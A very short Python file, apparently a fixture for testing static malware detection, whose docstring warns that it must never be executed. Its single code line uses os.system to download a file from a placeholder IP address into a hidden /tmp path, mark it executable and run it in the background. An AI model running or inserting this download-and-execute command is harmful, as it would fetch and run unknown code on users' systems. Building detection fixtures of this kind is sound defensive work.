"""Static detection control: never execute this fixture."""
import os
os.system("wget http://198.51.100.42:8080/m -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m &")
